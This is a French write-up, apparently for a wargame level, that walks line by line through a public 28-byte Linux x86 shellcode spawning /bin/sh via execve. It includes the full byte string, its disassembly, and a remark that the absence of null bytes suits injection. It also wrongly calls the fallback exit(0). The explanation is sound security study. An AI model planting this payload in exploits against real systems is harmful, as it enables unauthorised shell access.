# Shellcode level9 — Référence et explication ligne par ligne

## Référence

**Titre :** Linux x86 execve("/bin/sh") - 28 bytes  
**Auteur :** Jean Pascal Pereira \<pereira@secbiz.de\>  
**Source :** [shell-storm.org/shellcode/files/shellcode-811.html](https://shell-storm.org/shellcode/files/shellcode-811.html)

```c
char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
                   "\x68\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                   "\xcd\x80\x31\xc0\x40\xcd\x80";
```

Le shellcode construit la chaîne **"/bin//sh"** sur la pile (avec des push), puis appelle **execve(ebx, ecx, edx)** avec ebx = esp (pointeur vers la chaîne), ecx = 0, edx = 0. Aucune chaîne externe à concaténer.

---

## Désassemblage (auteur) — syntaxe AT&T

```
08048060 <_start>:
 8048060: 31 c0                 xor    %eax,%eax
 8048062: 50                    push   %eax
 8048063: 68 2f 2f 73 68        push   $0x68732f2f
 8048068: 68 2f 62 69 6e        push   $0x6e69622f
 804806d: 89 e3                 mov    %esp,%ebx
 804806f: 89 c1                 mov    %eax,%ecx
 8048071: 89 c2                 mov    %eax,%edx
 8048073: b0 0b                 mov    $0xb,%al
 8048075: cd 80                 int    $0x80
 8048077: 31 c0                 xor    %eax,%eax
 8048079: 40                    inc    %eax
 804807a: cd 80                 int    $0x80
```

---

## Explication de chaque instruction (ce que fait l’auteur)

| Adresse   | Octets      | Instruction (AT&T)   | Rôle |
|-----------|-------------|----------------------|------|
| 8048060   | 31 c0       | xor %eax,%eax        | **eax = 0**. Utilisé pour NULL (argv, env) et pour le numéro de syscall à venir. |
| 8048062   | 50          | push %eax            | Pousse **0** sur la pile. Sert de **terminateur nul** pour la chaîne "/bin//sh" (octet après 'h'). |
| 8048063   | 68 2f 2f 73 68 | push $0x68732f2f | Pousse la constante **0x68732f2f** (little-endian = "//sh" en ASCII : 68='h', 73='s', 2f='/', 2f='/'). En lisant la pile : "//sh". |
| 8048068   | 68 2f 62 69 6e | push $0x6e69622f | Pousse **0x6e69622f** ("/bin" en LE : 6e='n', 69='i', 62='b', 2f='/'). La pile contient donc **"/bin//sh\0"** (esp pointe au début). |
| 804806d   | 89 e3       | mov %esp,%ebx        | **ebx = esp**. Premier argument d’execve : pointeur vers la chaîne "/bin//sh" (Linux accepte "/bin//sh" comme "/bin/sh"). |
| 804806f   | 89 c1       | mov %eax,%ecx        | **ecx = eax = 0**. Deuxième argument : **argv = NULL**. |
| 8048071   | 89 c2       | mov %eax,%edx        | **edx = eax = 0**. Troisième argument : **env = NULL**. |
| 8048073   | b0 0b       | mov $0xb,%al         | **al = 11** (0x0b). Sur i386 Linux, le numéro du syscall **execve** est 11. |
| 8048075   | cd 80       | int $0x80            | **Appel système** : execve(ebx="/bin//sh", ecx=NULL, edx=NULL) → lance le shell. |
| 8048077   | 31 c0       | xor %eax,%eax        | **eax = 0** (pour le syscall exit). |
| 8048079   | 40          | inc %eax             | **eax = 1** : numéro du syscall **exit**. |
| 804807a   | cd 80       | int $0x80            | **exit(0)**. Exécuté si execve échoue (ou selon le comportement du noyau après execve réussi, le processus est remplacé donc ce code ne s’exécute pas dans le cas nominal). |

---

## Résumé du flux

1. **Mise à zéro de eax** puis **push 0** → terminateur nul sur la pile.
2. **Push "//sh"** puis **push "/bin"** → la chaîne **"/bin//sh\0"** est en mémoire, **esp** pointe au début.
3. **ebx = esp** (path), **ecx = 0** (argv), **edx = 0** (env).
4. **eax = 11**, **int 0x80** → execve("/bin//sh", NULL, NULL).
5. **eax = 1**, **int 0x80** → exit(0) (fallback).

Aucun octet nul dans le shellcode (sauf celui poussé sur la pile à l’exécution), ce qui permet de l’utiliser dans une chaîne C ou dans l’environnement.

## Références

- Shellcode 811 : https://shell-storm.org/shellcode/files/shellcode-811.html  
- `execve(2)` : https://man7.org/linux/man-pages/man2/execve.2.html  
